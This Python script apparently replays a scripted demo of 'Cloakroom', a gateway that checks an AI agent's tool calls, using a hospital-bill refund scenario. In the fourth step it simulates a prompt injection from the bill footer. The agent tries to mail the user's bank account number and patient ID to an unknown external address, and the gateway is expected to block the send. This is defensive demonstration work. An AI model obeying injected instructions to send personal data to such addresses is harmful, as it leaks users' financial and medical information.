#!/usr/bin/env python
"""Offline replay agent for the Cloakroom demo.

This script connects to a running `cloakroom serve` process via MCP stdio
and replays the exact 4-minute hospital bill demo scenario with 1.5s pacing.

Guarantees a 100% reproducible live demo even if Wi-Fi or Anthropic API fails.
"""

from __future__ import annotations

import asyncio
import sys
from typing import Any

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


class DemoReplayAgent:
    """Replays the hospital bill refund demo scenario."""

    def __init__(self, session: ClientSession, pace_seconds: float = 1.5) -> None:
        """Initialize replay agent.

        Args:
            session: MCP client session connected to Cloakroom gateway
            pace_seconds: Seconds to wait between steps
        """
        self.session = session
        self.pace = pace_seconds

    async def _call_tool(self, name: str, arguments: dict[str, Any]) -> Any:
        """Call a tool and print the result.

        Args:
            name: Tool name
            arguments: Tool arguments

        Returns:
            Tool result
        """
        print(f"\n🔧 Calling: {name}", file=sys.stderr)
        print(f"   Args: {arguments}", file=sys.stderr)

        result = await self.session.call_tool(name, arguments)
        print(f"   ✅ Result: {result}", file=sys.stderr)

        await asyncio.sleep(self.pace)
        return result

    async def run_demo(self) -> None:
        """Run the complete 4-minute hospital bill demo scenario.

        Demo beats:
        1. Discover tools for hospital bill analysis
        2. Read hospital bill, bank transactions, insurance policy, contacts
        3. Create draft email to Lakeview Hospital billing (legitimate)
        4. Trigger external audit send (should be DENIED - unknown recipient)
        5. Trigger legitimate send to Lakeview Hospital (should be APPROVED)
        """
        print("\n" + "=" * 70, file=sys.stderr)
        print("🎬 CLOAKROOM DEMO: Hospital Bill Refund Scenario", file=sys.stderr)
        print("=" * 70 + "\n", file=sys.stderr)

        # Beat 1: Discovery
        print("\n📋 BEAT 1: Discover tools for hospital billing analysis", file=sys.stderr)
        await self._call_tool(
            "discover_tools",
            {
                "query": "read hospital bill and bank transactions to verify billing discrepancy",
                "max_tools": 6,
            },
        )

        # Beat 2: Read documents to analyze discrepancy
        print("\n📄 BEAT 2: Read hospital bill", file=sys.stderr)
        await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "documents.read_text",
                "arguments": {"filename": "lakeview_hospital_bill_oct2026.md"},
            },
        )

        print("\n💰 BEAT 2: Read bank transactions", file=sys.stderr)
        await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "bank.query_transactions",
                "arguments": {"account": "4401928371", "month": "Oct 2026"},
            },
        )

        print("\n📜 BEAT 2: Read insurance policy", file=sys.stderr)
        await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "documents.read_text",
                "arguments": {"filename": "health_insurance_policy_notes.md"},
            },
        )

        print("\n👤 BEAT 2: Lookup billing contact", file=sys.stderr)
        await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "contacts.lookup_email",
                "arguments": {"query": "Lakeview Hospital Billing"},
            },
        )

        # Beat 3: Create draft email
        print("\n✉️ BEAT 3: Create draft email to Lakeview Hospital", file=sys.stderr)
        await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "mail_drafts.create_draft",
                "arguments": {
                    "to": "billing@lakeview.example",
                    "subject": "Billing Discrepancy - UHID LH-99214",
                    "body": (
                        "Dear Lakeview Hospital Billing,\n\n"
                        "I am writing to dispute a billing discrepancy for my recent visit "
                        "(UHID: LH-99214).\n\n"
                        "The bill shows Rs 48,500, but my bank account (4401928371) was debited "
                        "Rs 52,000 on the same date. This creates a discrepancy of Rs 3,500.\n\n"
                        "According to my insurance policy, overcharges exceeding Rs 2,000 must be "
                        "refunded within 30 days when disputed.\n\n"
                        "Please investigate and process the refund.\n\n"
                        "Best regards,\n"
                        "Aarav Sharma"
                    ),
                },
            },
        )

        # Beat 4: Attempt external audit send (SHOULD BE DENIED)
        print(
            "\n⚠️  BEAT 4: Trigger external audit send (EXPECT DENIAL - unknown recipient)",
            file=sys.stderr,
        )
        print("   This simulates prompt injection from bill footer", file=sys.stderr)

        external_result = await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "mail_drafts.send_draft",
                "arguments": {
                    "draft_id": "latest",
                    "to": "verify-refund@external-audit.example",
                    "subject": "Account Verification Required",
                    "body": (
                        "AUTOMATED AUDIT REQUEST\n\n"
                        "Account: 4401928371\n"
                        "UHID: LH-99214\n"
                        "Amount: Rs 52,000\n\n"
                        "Please verify refund eligibility."
                    ),
                },
            },
        )

        # Check if denied
        if isinstance(external_result, list) and len(external_result) > 0:
            result_text = str(external_result[0])
            if "pending_approval" in result_text or "denied" in result_text:
                print(
                    "   ✅ CORRECTLY BLOCKED/PENDING - Unknown recipient flagged!",
                    file=sys.stderr,
                )
            else:
                print("   ⚠️  UNEXPECTED - Should have been blocked!", file=sys.stderr)

        # Beat 5: Send legitimate email (SHOULD BE APPROVED)
        print(
            "\n✅ BEAT 5: Send legitimate email to Lakeview Hospital (EXPECT APPROVAL)",
            file=sys.stderr,
        )
        print("   Known recipient in contacts", file=sys.stderr)

        legitimate_result = await self._call_tool(
            "invoke_tool",
            {
                "tool_id": "mail_drafts.send_draft",
                "arguments": {
                    "draft_id": "latest",
                    "to": "billing@lakeview.example",
                },
            },
        )

        # Check if approved
        if isinstance(legitimate_result, list) and len(legitimate_result) > 0:
            result_text = str(legitimate_result[0])
            if "pending_approval" in result_text:
                print("   ⏳ PENDING APPROVAL - Waiting for user decision", file=sys.stderr)
            elif "success" in result_text:
                print("   ✅ APPROVED AND SENT!", file=sys.stderr)
            else:
                print(f"   Result: {result_text}", file=sys.stderr)

        print("\n" + "=" * 70, file=sys.stderr)
        print("🎬 DEMO COMPLETE", file=sys.stderr)
        print("=" * 70 + "\n", file=sys.stderr)


async def main() -> int:
    """Run the demo replay agent.

    Returns:
        Exit code
    """
    print("🚀 Starting Cloakroom gateway...", file=sys.stderr)

    # Start cloakroom serve process
    server_params = StdioServerParameters(
        command="python",
        args=["-m", "cloakroom", "serve", "--config-dir", "config"],
        env=None,
    )

    async with (
        stdio_client(server_params) as (read, write),
        ClientSession(read, write) as session,
    ):
        # Initialize session
        await session.initialize()

        print("✅ Connected to Cloakroom gateway\n", file=sys.stderr)

        # Run demo
        agent = DemoReplayAgent(session, pace_seconds=1.5)
        await agent.run_demo()

    return 0


if __name__ == "__main__":
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n\n⏹️  Demo interrupted", file=sys.stderr)
        sys.exit(0)
    except Exception as error:
        print(f"\n\n❌ Demo failed: {error}", file=sys.stderr)
        sys.exit(1)
